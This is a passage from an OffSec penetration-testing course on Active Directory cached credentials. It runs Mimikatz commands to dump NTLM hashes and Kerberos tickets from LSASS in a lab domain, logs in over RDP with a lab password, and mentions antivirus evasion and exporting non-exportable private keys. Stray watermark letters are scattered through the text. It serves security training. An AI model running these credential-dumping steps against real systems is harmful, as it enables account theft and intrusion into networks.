Module Lateral Movement in Active Directory, we must first discuss the various password hashes
k
used with Kerberos and show how they are stored.
We already covered some of the following informations in the Password Attacks Module. In this
section, we’ll focus on cached credentials and tickets in the context of AD.
o
Since Microsoft’s implementation of Kerberos makes use of single sign-on, password hashes
must be stored somewhere in order to renew a TGT request.
n
In modern versions of Windows, these hashes are stored in the Local Security Authority
Subsystem Service (LSASS)1079 memory space.1080
i
If we gain access to these hashes, we could crack them to obtain the cleartext password or reuse
z
them to perform various actions.
Although this is the end goDal of our AD attack, the process is not as straightforward as it seems.
Since the LSASS process is part of the operating system and runs as SYSTEM, we need SYSTEM
(or local administrator) permissions to gain access to the hashes stored on a target.
Because of this, we often have to start our attack with a local privilege escalation in order to
retrieve the stored hashes. To make things even more tricky, the data structures used to store the
hashes in memory are not publicly documented, and they are also encrypted with an LSASS-
stored key.
Nevertheless, since the extraction of cached credentials is a large attack vector against Windows
and Active Directory, several tools have been created to extract the hashes. The most popular of
these tools is Mimikatz.1081
Let’s try to use Mimikatz to extract domain hashes on our Windows 11 system.
1079 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service
1080 (Active Directory Security, 2018), https://adsecurity.org/?page_id=1821
1081 (Benjamin Delphy, 2022), https://github.com/gentilkiwi/mimikatz
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 751
Made in Morocco
Penetration Testing with Kali Linux
In the following example, we will run Mimikatz as a standalone application.
However, due to the mainstream popularity of Mimikatz and well-known
detection signatures, consider avoiding using it as a standalone application and
use methods discussed in the Antivirus Evasion Module instead. For example,
execute Mimikatz directly from memory using an injector like PowerShell,1082 or
use a built-in tool like Task Manager to dump the entire LSASS process
memory,1083 move the dumped data to a helper machine, and then load the data
into Mimikatz.1084
Since the jeff domain user is a local administrator on CLIENT75, we are able to launch a
PowerShell prompt with elevated privileges. First, let’s connect to this machine as jeff with the
password HenchmanPutridBonbon11 over RDP.
y
kali@kali:~$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11
/v:192.168.50.75 k
Listing 792 - Connecting to CLIENT75 via RDP
s
Once connected, we start a PowerShell session as Administrator. From this command prompt,
we can start Mimikatz1085 and enter privilege::deboug to engage the SeDebugPrivlege1086 privilege,
which will allow us to interact with a process owned by another account.
PS C:\Windows\system32> cd C:\Tools n
PS C:\Tools\> .\mimikatz.exe
... i
z
mimikatz # privilege::debug
Privilege '20' OK
D
Listing 793 - Starting Mimikatz and enabling SeDebugPrivilege
Now we can run sekurlsa::logonpasswords to dump the credentials of all logged-on users with
the Sekurlsa1087 module.
This should dump hashes for all users logged on to the current workstation or server, including
remote logins like Remote Desktop sessions.
mimikatz # sekurlsa::logonpasswords
Authentication Id : 0 ; 4876838 (00000000:004a6a26)
Session : RemoteInteractive from 2
User Name : jeff
1082 (Matt Graeber, 2016), https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-
ReflectivePEInjection.ps1
1083 (White Oak Security, 2021), https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/
1084 (Ruben Boonen, 2016), http://www.fuzzysecurity.com/tutorials/18.html
1085 (Benjamin Delphu, 2019), https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa
1086 (Microsoft, 2022), https://msdn.microsoft.com/en-us/library/windows/desktop/bb530716(v=vs.85).aspx
1087 (Mimikatz, 2019), https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 752
Made in Morocco
Penetration Testing with Kali Linux
Domain : CORP
Logon Server : DC1
Logon Time : 9/9/2022 12:32:11 PM
SID : S-1-5-21-1987370270-658905905-1781884369-1105
msv :
[00000003] Primary
* Username : jeff
* Domain : CORP
* NTLM : 2688c6d2af5e9c7ddb268899123744ea
* SHA1 : f57d987a25f39a2887d158e8d5ac41bc8971352f
* DPAPI : 3a847021d5488a148c265e6d27a420e6
tspkg :
wdigest :
* Username : jeff
* Domain : CORP
* Password : (null) y
kerberos :
* Username : jeff
* Domain : CORP.COM k
* Password : (null)
ssp :
s
credman :
cloudap :
... o
Authentication Id : 0 ; 122474 (00000000:0001de6a)
Session : Service from 0
User Name : dave n
Domain : CORP
Logon Server : DC1
Logon Time : 9/9/2022 1:3i2:23 AM
SID : S-1-5-21-1z987370270-658905905-1781884369-1103
msv :
[00000003] Primary
D
* Username : dave
* Domain : CORP
* NTLM : 08d7a47a6f9f66b97b1bae4178747494
* SHA1 : a0c2285bfad20cc614e2d361d6246579843557cd
* DPAPI : fed8536adc54ad3d6d9076cbc6dd171d
tspkg :
wdigest :
* Username : dave
* Domain : CORP
* Password : (null)
kerberos :
* Username : dave
* Domain : CORP.COM
* Password : (null)
ssp :
credman :
cloudap :
...
Listing 794 - Executing Mimikatz on a domain workstation
The output above shows all credential information stored in LSASS for the domain users jeff and
dave, including cached hashes.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 753
Made in Morocco
Penetration Testing with Kali Linux
An effective defensive technique to prevent tools such as Mimikatz from
extracting hashes is to enable additional LSA Protection.1088 The LSA includes the
LSASS process. By setting a registry key, Windows prevents reading memory
from this process. We’ll discuss how to bypass this and other powerful defensive
mechanisms in-depth in OffSec’s Evasion Techniques and Breaching Defenses
course, PEN-300.
We can observe two types of hashes highlighted in the output above. This will vary based on the
functional level of the AD implementation. For AD instances at a functional level of Windows
2003, NTLM is the only available hashing algorithm. For instances running Windows Server 2008
or later, both NTLM and SHA-1 (a common companion for AES encryption) may be available. On
older operating systems like Windows 7, or operating systems that have it manually set,
y
WDigest1089 will be enabled. When WDigest is enabled, running Mimikatz will reveal cleartext
passwords alongside the password hashes.
k
Armed with these hashes, we could attempt to crack them and obtain the cleartext password as
we did in Password Attacks.
s
A different approach and use of Mimikatz is to exploit Kerberos authentication by abusing TGT
and service tickets. As already discussed, we knoow that Kerberos TGT and service tickets for
users currently logged on to the local machine are stored for future use. These tickets are also
stored in LSASS, and we can use Mimikatz to interact with and retrieve our own tickets as well as
n
the tickets of other local users.
Let’s open a second PowerShell window and list the contents of the SMB share on WEB04 with
i
UNC path \\web04.corp.com\backup. This will create and cache a service ticket.
z
PS C:\Users\jeff> dir \\web04.corp.com\backup
D
Directory: \\web04.corp.com\backup
Mode LastWriteTime Length Name
---- ------------- ------ ----
-a---- 9/13/2022 2:52 AM 0 backup_schemata.txt
Listing 795 - Displaying contents of a SMB share
Once we’ve executed the directory listing on the SMB share, we can use Mimikatz to show the
tickets that are stored in memory by entering sekurlsa::tickets.
mimikatz # sekurlsa::tickets
Authentication Id : 0 ; 656588 (00000000:000a04cc)
Session : RemoteInteractive from 2
1088 (Microsoft Documentation, 2022), https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-
management/configuring-additional-lsa-protection
1089 (Microsoft, 2003), https://technet.microsoft.com/en-us/library/cc778868(v=ws.10).aspx
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 754
Made in Morocco
Penetration Testing with Kali Linux
User Name : jeff
Domain : CORP
Logon Server : DC1
Logon Time : 9/13/2022 2:43:31 AM
SID : S-1-5-21-1987370270-658905905-1781884369-1105
* Username : jeff
* Domain : CORP.COM
* Password : (null)
Group 0 - Ticket Granting Service
[00000000]
Start/End/MaxRenew: 9/13/2022 2:59:47 AM ; 9/13/2022 12:43:56 PM ;
9/20/2022 2:43:56 AM
Service Name (02) : cifs ; web04.corp.com ; @ CORP.COM
Target Name (02) : cifs ; web04.corp.com ; @ CORPy.COM
Client Name (01) : jeff ; @ CORP.COM
Flags 40a10000 : name_canonicalize ; pre_authent ; renewable ;
forwardable ; k
Session Key : 0x00000001 - des_cbc_crc
38dba17553c8a894c79042fe7265a00e36e7370b99505b8da326ff9b12aaf9c7
s
Ticket : 0x00000012 - aes256_hmac ; kvno = 3 [...]
[00000001]
Start/End/MaxRenew: 9/13/2022 2:43o:56 AM ; 9/13/2022 12:43:56 PM ;
9/20/2022 2:43:56 AM
Service Name (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
Target Name (02) : LDAP ; DnC1.corp.com ; corp.com ; @ CORP.COM
Client Name (01) : jeff ; @ CORP.COM ( CORP.COM )
Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ;
renewable ; forwardable ; i
Session Key :z 0x00000001 - des_cbc_crc
c44762f3b4755f351269f6f98a35c06115a53692df268dead22bc9f06b6b0ce5
Ticket : 0x00000012 - aes256_hmac ; kvno = 3 [...]
D
Group 1 - Client Ticket ?
Group 2 - Ticket Granting Ticket
[00000000]
Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ;
9/20/2022 2:43:56 AM
Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
Target Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
Client Name (01) : jeff ; @ CORP.COM ( CORP.COM )
Flags 40e10000 : name_canonicalize ; pre_authent ; initial ; renewable ;
forwardable ;
Session Key : 0x00000001 - des_cbc_crc
bf25fbd514710a98abaccdf026b5ad14730dd2a170bca9ded7db3fd3b853892a
Ticket : 0x00000012 - aes256_hmac ; kvno = 2 [...]
...
Listing 796 - Extracting Kerberos tickets with mimikatz
The output shows both a TGT and a TGS. Stealing a TGS would allow us to access only particular
resources associated with those tickets. Alternatively, armed with a TGT, we could request a TGS
for specific resources we want to target within the domain. We will discuss how to leverage
stolen or forged tickets later on in this and the next Module.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 755
Made in Morocco
Penetration Testing with Kali Linux
Mimikatz can also export tickets to the hard drive and import tickets into LSASS, which we will
explore later.
Before covering attacks on AD authentication mechanisms, let’s briefly explore the use of Public
Key Infrastructure (PKI)1090 in AD. Microsoft provides the AD role Active Directory Certificate
Services (AD CS)1091 to implement a PKI, which exchanges digital certificates between
authenticated users and trusted resources.
If a server is installed as a Certification Authority (CA),1092 it can issue and revoke digital
certificates (and much more). While a deep discussion on these concepts would require its own
Module, let’s focus on one aspect of cached and stored objects related to AD CS.
For example, we could issue certificates for web servers to use HTTPS or to authenticate users
based on certificates from the CA via Smart Cards.1093
y
These certificates may be marked as having a non-exportable private key1094 for security reasons.
If so, a private key associated with a certificate cannot be exported even with administrative
privileges. However, there are various methods to export the cekrtificate with the private key.
We can rely again on Mimikatz to accomplish this. The crypto1095 module contains the capability
s
to either patch the CryptoAPI1096 function with crypto::capi1097 or KeyIso1098 service with
crypto::cng,1099 making non-exportable keys exportable.
o
As we’ve now covered in this section and in Password Attacks, Mimikatz can extract information
related to authentication performed through most protocols and mechanisms, making this tool a
n
real Swiss Army knife for cached credentials!
22.2 Performing Attacksi on Active Directory Authentication
z
This Learning Unit covers the following Learning Objectives:
D
• Use password attacks to obtain valid user credentials
• Abuse enabled user account options
• Abuse the Kerberos SPN authentication mechanism
• Forge service tickets
• Impersonate a domain controller to retrieve any domain user credentials
1090 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Public_key_infrastructure
1091 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/training/modules/implement-manage-active-directory-
certificate-services/
1092 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Certificate_authority
1093 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Smart_card
1094 (Microsoft Techcommunity, 2020), https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/marking-private-
keys-as-non-exportable-with-certutil-importpfx/ba-p/1128390
1095 (Github Mimikatz Wiki, 2016), https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto
1096 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/seccrypto/cryptoapi-system-architecture
1097 (Github Mimikatz Wiki, 2016), https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#capi
1098 (Revert Service, 2022), http://revertservice.com/10/keyiso/
1099 (Github Mimikatz Wiki, 2016), https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#cng
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 756
Made in Morocco
Penetration Testing with Kali Linux
In the previous Learning Unit, we discussed NTLM and Kerberos authentication, as well as where
we can find cached AD credentials and objects. In this Learning Unit, we’ll explore various attacks
in the context of these authentication mechanisms. The attack techniques are introduced
independently from each other as they can be used in several different phases of a penetration
test. For a majority of attacks, we’ll also discuss ways of performing them from Windows and
Linux alike, making us more flexible and able to adapt to a variety of real world assessment
scenarios.
22.2.1 Password Attacks
In a previous Module, we examined several password attacks on network services and hashed
information. Password attacks are also a viable choice in the context of AD to obtain user
credentials. In this section, we’ll explore various AD password attacks.
Before exploring these attacks, we need to account for one impyortant consideration. When
performing a brute force or wordlist authentication attack, we must be aware of account
lockouts. Too many failed logins may block the account for further attacks and possibly alert
k